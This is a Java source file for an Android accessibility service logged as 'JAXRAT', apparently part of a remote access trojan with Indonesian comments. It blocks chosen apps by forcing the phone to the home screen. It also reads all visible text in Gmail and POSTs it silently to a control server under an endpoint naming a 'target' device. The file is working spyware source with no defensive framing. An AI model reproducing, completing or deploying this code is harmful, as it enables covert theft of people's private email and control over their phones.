package com.ezax.agent;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class JaxAccessibilityService extends AccessibilityService {
    private static final String SERVER_URL = "http://192.168.1.23:5000"; // SESUAIKAN IP
    private Set<String> blockedApps = new HashSet<>();
    private String lastScrapedText = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d("JAXRAT", "Accessibility Service Connected");
        loadBlockedApps();
    }

    private void loadBlockedApps() {
        SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
        String blockedString = prefs.getString("blocked_apps", "");
        blockedApps.clear();
        if (!blockedString.isEmpty()) {
            for (String app : blockedString.split(",")) {
                blockedApps.add(app.trim());
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                String packageName = event.getPackageName().toString();
                
                // 1. LOGIKA APP BLOCKER
                loadBlockedApps(); // Reload setiap ganti layar
                if (blockedApps.contains(packageName)) {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    Log.d("JAXRAT", "Memblokir aplikasi: " + packageName);
                    return;
                }

                // 2. LOGIKA GMAIL SCRAPER
                if (packageName.equals("com.google.android.gm")) {
                    scrapeScreenText(getRootInActiveWindow());
                }
            }
        } else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            if (event.getPackageName() != null && event.getPackageName().toString().equals("com.google.android.gm")) {
                scrapeScreenText(getRootInActiveWindow());
            }
        }
    }

    private void scrapeScreenText(AccessibilityNodeInfo root) {
        if (root == null) return;
        StringBuilder sb = new StringBuilder();
        extractText(root, sb);
        String finalText = sb.toString().trim();
        
        // Biar gak spam, cuma kirim kalau teksnya beda dan lumayan panjang
        if (finalText.length() > 20 && !finalText.equals(lastScrapedText)) {
            lastScrapedText = finalText;
            kirimKeWeb(finalText);
        }
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            sb.append(node.getText().toString()).append(" ");
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChild(i), sb);
        }
    }

    private void kirimKeWeb(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/upload_result/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("type", "gmail");
                json.put("data", text);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    @Override
    public void onInterrupt() { }
}
